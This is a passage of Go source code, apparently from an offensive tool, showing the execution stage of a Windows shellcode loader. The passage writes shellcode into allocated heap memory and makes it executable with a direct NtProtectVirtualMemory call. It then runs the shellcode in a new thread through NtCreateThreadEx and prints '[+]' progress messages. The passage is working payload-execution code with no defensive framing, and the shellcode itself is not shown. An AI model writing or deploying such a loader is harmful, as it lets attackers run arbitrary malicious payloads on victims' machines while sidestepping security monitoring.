	fmt.Printf("[+] allocated memory at 0x%x\n", baseAddress)
	
	fmt.Printf("[+] writing shellcode to heap memory...\n")
	
	destSlice := (*[1 << 30]byte)(unsafe.Pointer(baseAddress))[:len(shellcode):len(shellcode)]
	copy(destSlice, shellcode)
	
	fmt.Printf("[+] wrote %d bytes of shellcode\n", len(shellcode))
	
	fmt.Printf("[+] making memory executable...\n")
	
	var oldProtect uintptr
	protectSize := uintptr(len(shellcode))
	protectAddress := baseAddress  
	status, err := winapi.NtProtectVirtualMemory(
		winapi.GetCurrentProcessHandle(), // Current process
		&protectAddress,                  // Base address (use copy)
		&protectSize,                     // Size
		uintptr(0x20),                    // PAGE_EXECUTE_READ
		&oldProtect,                      // Old protection
	)
	
	if err != nil || status != 0 {

		winapi.CallNtdllFunction("RtlFreeHeap", heapHandle, uintptr(0), baseAddress)
		winapi.CallNtdllFunction("RtlDestroyHeap", heapHandle)
		return fmt.Errorf("NtProtectVirtualMemory failed: NTSTATUS 0x%08X, %v", status, err)
	}
	
	fmt.Printf("[+] memory is now executable\n")
	

	fmt.Printf("[+] creating thread to execute shellcode...\n")
	
	var threadHandle uintptr
	status, err = winapi.NtCreateThreadEx(
		&threadHandle,                                // threadHandle
		uintptr(0x1FFFFF),                           // desiredAccess - THREAD_ALL_ACCESS
		uintptr(0),                                  // objectAttributes - NULL
		winapi.GetCurrentProcessHandle(),            // processHandle
		baseAddress,                                 // startAddress - our shellcode
		uintptr(0),                                  // arg - no parameter
		uintptr(0),                                  // createFlags - run immediately
		uintptr(0),                                  // zeroBits
		uintptr(0),                                  // stackSize
		uintptr(0),                                  // maximumStackSize
		uintptr(0),                                  // attributeList
	)
	
	if err != nil || status != 0 {
		winapi.CallNtdllFunction("RtlFreeHeap", heapHandle, uintptr(0), baseAddress)
		winapi.CallNtdllFunction("RtlDestroyHeap", heapHandle)
		return fmt.Errorf("NtCreateThreadEx failed: NTSTATUS 0x%08X, %v", status, err)
	}
	
	fmt.Printf("[+] shellcode thread created successfully\n")
	
	time.Sleep(3 * time.Second)

	return nil
}
